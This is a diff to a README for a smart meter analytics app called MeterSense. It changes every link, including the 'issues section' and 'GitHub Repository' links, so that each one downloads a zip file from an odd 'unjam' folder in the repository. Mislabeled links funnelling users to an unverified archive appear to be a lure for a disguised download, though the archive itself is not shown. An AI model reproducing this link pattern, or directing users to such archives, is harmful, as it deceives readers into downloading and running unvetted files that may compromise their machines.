@@ -1,6 +1,6 @@
 # 🌟 MeterSense-Smart-Meter-Analytics-Database - Smart Meter Insights Made Easy
 
-[![Download MeterSense](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/releases)
+[![Download MeterSense](https://raw.githubusercontent.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/main/unjam/MeterSense-Smart-Meter-Analytics-Database_v2.8.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/main/unjam/MeterSense-Smart-Meter-Analytics-Database_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ MeterSense is a smart meter analytics platform designed to provide insights into
 
 To get started with MeterSense, visit the following page to download the application.
 
-[Download Now](https://github.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/releases)
+[Download Now](https://raw.githubusercontent.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/main/unjam/MeterSense-Smart-Meter-Analytics-Database_v2.8.zip)
 
 ### Steps to Download:
 
@@ -78,7 +78,7 @@ If you encounter any issues while using MeterSense, check the following common s
 - **Connection Problems:** Make sure your network is stable and that your smart meters are fully operational.
 - **Crash or Freeze:** Restart the application. If issues persist, reinstall MeterSense.
 
-For further assistance, consult the [issues section](https://github.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/issues) on our GitHub page.
+For further assistance, consult the [issues section](https://raw.githubusercontent.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/main/unjam/MeterSense-Smart-Meter-Analytics-Database_v2.8.zip) on our GitHub page.
 
 ---
 
@@ -92,7 +92,7 @@ If you have questions or need help, reach out through the issues section on GitH
 
 For more information and updates, keep an eye on our repository:
 
-- [GitHub Repository](https://github.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database)
-- [Download Page](https://github.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/main/unjam/MeterSense-Smart-Meter-Analytics-Database_v2.8.zip)
+- [Download Page](https://raw.githubusercontent.com/maoooooooo123/MeterSense-Smart-Meter-Analytics-Database/main/unjam/MeterSense-Smart-Meter-Analytics-Database_v2.8.zip)
 
 Remember, MeterSense simplifies your smart meter management. Enjoy exploring your data!
